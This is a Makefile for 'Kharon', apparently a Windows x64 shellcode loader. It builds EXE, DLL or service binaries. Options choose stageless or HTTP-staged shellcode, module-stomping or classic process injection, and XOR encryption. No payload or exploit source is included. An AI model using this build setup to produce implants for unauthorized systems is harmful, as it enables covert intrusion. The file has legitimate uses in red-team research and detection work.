NAME   := Kharon
BUILD_PATH ?= .
OBJ_PATH   := $(BUILD_PATH)/Bin

CCX64 := clang++ -target x86_64-w64-mingw32

FORMAT              ?= Undefined
RSRC_ID             ?= Undefined
CUSTOM_SECTION_NAME ?= Undefined
ENCRYPTION_TYPE     ?= Undefined
XOR_KEY             ?= Undefined
INJECTION_TECHNIQUE ?= Undefined
SHELLCODE_SOURCE    ?= Undefined
STAGE_TYPE          ?= Undefined

CFLAGS := \
    -Os       \
    -mwindows \
    -nostdlib \
    -s

LIBS := \
    -lkernel32 \
    -ladvapi32 \
    -lntdll    \
    -lmsvcrt

DEFS := \
    -D XOR_KEY='$(XOR_KEY)'

#  Shellcode Source
SHELLCODE_SOURCE_CLEAN := $(strip $(SHELLCODE_SOURCE))

ifeq ($(SHELLCODE_SOURCE_CLEAN),rsrc)
    SHELLCODE_SRC := Source/Stageless/rsrc.cc
    DEFS          += -D SHELLCODE_SECTION_LOCATION=SHELLCODE_SECTION_RSRC
    DEFS          += -D RSRC_ID=$(RSRC_ID)
    RES_OBJ       := Include/shellcode.res
endif

ifeq ($(SHELLCODE_SOURCE_CLEAN),network)
    SHELLCODE_SRC := Source/Staged/http_staging.cc
    DEFS          += -D SHELLCODE_SECTION_LOCATION=SHELLCODE_SECTION_OTHER
    LIBS          += -lwinhttp
    RES_OBJ       :=
endif

ifeq ($(SHELLCODE_SOURCE_CLEAN),section)
    SHELLCODE_SRC := Source/Stageless/sections.cc
    DEFS          += -D SHELLCODE_SECTION_LOCATION=SHELLCODE_SECTION_OTHER
    RES_OBJ       :=
endif

#  Injection Technique
INJECTION_TECHNIQUE_CLEAN := $(strip $(INJECTION_TECHNIQUE))

ifeq ($(INJECTION_TECHNIQUE_CLEAN),Module Stomp)
    INJECTION_SRC := Source/Injection/Stomper.cc
    DEFS          += -D INJECTION_TECHNIQUE=INJECTION_TECHNIQUE_STOMPER
endif

ifeq ($(INJECTION_TECHNIQUE_CLEAN),Classic)
    INJECTION_SRC := Source/Injection/Classic.cc
    DEFS          += -D INJECTION_TECHNIQUE=INJECTION_TECHNIQUE_CLASSIC
endif

#  Encryption Type 
ENCRYPTION_TYPE_CLEAN := $(strip $(ENCRYPTION_TYPE))

ifeq ($(ENCRYPTION_TYPE_CLEAN),xor)
    DEFS += -D ENCRYPTION_TYPE=ENCRYPTION_XOR
endif

ifeq ($(ENCRYPTION_TYPE_CLEAN),none)
    DEFS += -D ENCRYPTION_TYPE=ENCRYPTION_NONE
endif

#  Format 
ifeq ($(FORMAT),Exe)
    SRC    := Source/Main/Exe.cc
    OUT    := $(OBJ_PATH)/$(NAME).x64.$(STAGE_TYPE).exe
    XFLAGS := -Wl,-e,WinMain
endif

ifeq ($(FORMAT),Dll)
    SRC    := Source/Main/Dll.cc
    OUT    := $(OBJ_PATH)/$(NAME).x64.$(STAGE_TYPE).dll
    XFLAGS := -shared
endif

ifeq ($(FORMAT),Svc)
    SRC    := Source/Main/Svc.cc
    OUT    := $(OBJ_PATH)/$(NAME).x64.$(STAGE_TYPE).svc.exe
    XFLAGS := -Wl,-e,WinMain
endif

INC            := Include
ENTRY          := Source/Entry.cc
ENCRYPTION_SRC := Source/Encryption.cc

.PHONY: all exe dll svc build clean

all: build

exe:
	@ $(MAKE) FORMAT=Exe SHELLCODE_SOURCE=$(SHELLCODE_SOURCE) STAGE_TYPE=$(STAGE_TYPE) XOR_KEY='$(XOR_KEY)' INJECTION_TECHNIQUE='$(INJECTION_TECHNIQUE)' ENCRYPTION_TYPE=$(ENCRYPTION_TYPE) build

dll:
	@ $(MAKE) FORMAT=Dll SHELLCODE_SOURCE=$(SHELLCODE_SOURCE) STAGE_TYPE=$(STAGE_TYPE) XOR_KEY='$(XOR_KEY)' INJECTION_TECHNIQUE='$(INJECTION_TECHNIQUE)' ENCRYPTION_TYPE=$(ENCRYPTION_TYPE) build

svc:
	@ $(MAKE) FORMAT=Svc SHELLCODE_SOURCE=$(SHELLCODE_SOURCE) STAGE_TYPE=$(STAGE_TYPE) XOR_KEY='$(XOR_KEY)' INJECTION_TECHNIQUE='$(INJECTION_TECHNIQUE)' ENCRYPTION_TYPE=$(ENCRYPTION_TYPE) build

build: $(OBJ_PATH)
	@ echo "SHELLCODE_SOURCE  = '$(SHELLCODE_SOURCE_CLEAN)'"
	@ echo "STAGE_TYPE        = '$(STAGE_TYPE)'"
	@ echo "INJECTION         = '$(INJECTION_TECHNIQUE_CLEAN)'"
	@ echo "ENCRYPTION        = '$(ENCRYPTION_TYPE_CLEAN)'"
	@ echo "DEFS              =  $(DEFS)"
	@ echo "RES_OBJ           = '$(RES_OBJ)'"
	@ echo "[*] Compiling $(FORMAT) x64 ($(STAGE_TYPE))..."
	@ $(CCX64)            \
	    -I $(INC)         \
	    -o $(OUT)         \
	    $(ENTRY)          \
	    $(SRC)            \
	    $(RES_OBJ)        \
	    $(SHELLCODE_SRC)  \
	    $(INJECTION_SRC)  \
	    $(ENCRYPTION_SRC) \
	    $(CFLAGS)         \
	    $(DEFS)           \
	    $(XFLAGS)         \
	    $(LIBS)
	@ echo "[✓] Build completed: $(OUT)"

$(OBJ_PATH):
	@ mkdir -p $(OBJ_PATH)

clean:
	@ rm -f $(OBJ_PATH)/$(NAME).x64.*.exe     \
	        $(OBJ_PATH)/$(NAME).x64.*.dll     \
	        $(OBJ_PATH)/$(NAME).x64.*.svc.exe
	@ rm -f $(INC)/Shellcode.h
	@ rm -f $(INC)/StagingProfile.h
	@ rm -f $(INC)/shellcode.bin
	@ rm -f $(INC)/shellcode.rc
	@ rm -f $(INC)/shellcode.res
	@ rm -f $(OBJ_PATH)/$(NAME).x64.staged.bin
	@ echo "[✓] Cleanup completed"